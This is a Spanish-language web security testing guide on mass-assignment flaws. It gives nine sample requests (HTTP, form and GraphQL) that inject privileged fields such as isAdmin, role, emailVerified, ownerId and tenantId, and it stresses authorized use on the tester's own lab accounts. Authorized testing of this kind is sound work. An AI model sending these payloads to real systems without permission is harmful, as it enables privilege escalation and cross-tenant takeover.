# 🗡️ Mass assignment: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. isAdmin en registro

**Objetivo:** Añadir un atributo de privilegio a la creación de una cuenta propia de laboratorio.

```http
POST /api/register HTTP/1.1
Host: {ORIGEN}
Content-Type: application/json

{"email":"{EMAIL_PROPIO_NUEVO}","password":"{PASSWORD_DE_LAB}","isAdmin":true}
```

**Interpretación:** Leer la cuenta creada y probar una función de rol alto. Eco del JSON sin persistencia ni privilegio no confirma fallo.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Mass%20Assignment/README.md).

### 2. role en actualización de perfil

**Objetivo:** Añadir role a un PATCH legítimo de la cuenta propia de rol bajo.

```http
PATCH /api/me HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"displayName":"prueba-controlada","role":"admin"}
```

**Interpretación:** Comprobar valor persistido y autorización efectiva. Restaurar displayName y no asumir que role es el campo real.

**Fuente técnica:** [documentación de la técnica](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).

### 3. Estado de verificación

**Objetivo:** Si la representación propia expone emailVerified o verified, comprobar que el cliente no pueda escribirlo.

```http
PATCH /api/me HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"displayName":"prueba-controlada","emailVerified":true}
```

**Interpretación:** Verificar persistencia y una decisión que dependa de verificación; el simple reflejo del campo no demuestra bypass.

**Fuente técnica:** [documentación de la técnica](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).

### 4. ownerId en creación de objeto

**Objetivo:** Crear un objeto propio de A indicando como dueño la cuenta propia B.

```http
POST /api/projects HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"name":"proyecto-de-prueba","ownerId":"{ID_CUENTA_B}"}
```

**Interpretación:** Si se crea, consultar propiedad con A y B. La API debe derivar el dueño del principal o validar permiso de reasignación.

**Fuente técnica:** [documentación de la técnica](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).

### 5. tenantId no editable

**Objetivo:** En un tenant de prueba, agregar otro tenantId propio a una edición permitida.

```http
PATCH /api/projects/{PROYECTO_A} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"name":"proyecto-de-prueba","tenantId":"{TENANT_PROPIO_B}"}
```

**Interpretación:** Confirmar si cambió la pertenencia real desde ambas cuentas; un identificador reflejado no prueba traspaso.

**Fuente técnica:** [documentación de la técnica](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).

### 6. Objeto anidado sensible

**Objetivo:** Si el esquema admite un objeto user anidado, intentar incluir un atributo de rol no editable.

```json
{"profile":{"displayName":"prueba-controlada"},"user":{"roles":["admin"]}}
```

**Interpretación:** Usar una estructura observada en el modelo real. Algunos binders enlazan propiedades anidadas aun si la UI no las envía.

**Fuente técnica:** [documentación de la técnica](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).

### 7. Binding de formulario

**Objetivo:** Comparar un campo extra en form-urlencoded cuando la API acepta formularios además de JSON.

```http
POST /account/profile HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_A}
Content-Type: application/x-www-form-urlencoded

displayName=prueba-controlada&isAdmin=true
```

**Interpretación:** El formato alterno puede pasar por otro binder. Confirmar persistencia y función de privilegio bajo la cuenta propia.

**Fuente técnica:** [documentación de la técnica](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).

### 8. PUT de objeto completo

**Objetivo:** En un recurso propio con PUT real, añadir una propiedad de solo lectura a la representación completa.

```http
PUT /api/projects/{PROYECTO_A} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"id":"{PROYECTO_A}","name":"proyecto-de-prueba","createdBy":"{ID_CUENTA_B}"}
```

**Interpretación:** Probar solo si PUT conserva campos omitidos o en un objeto descartable propio; corroborar createdBy con GET posterior.

**Fuente técnica:** [documentación de la técnica](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).

### 9. Input de mutación GraphQL

**Objetivo:** Agregar un atributo de control al input de una mutación de perfil propia.

```graphql
mutation Editar($input: UpdateProfileInput!) { updateProfile(input: $input) { id role } }
variables: {"input":{"displayName":"prueba-controlada","role":"admin"}}
```

**Interpretación:** La sintaxis de variables se adapta al esquema observado. Si el tipo no declara role, rechazo de validación no informa sobre el binder.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/graphql).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
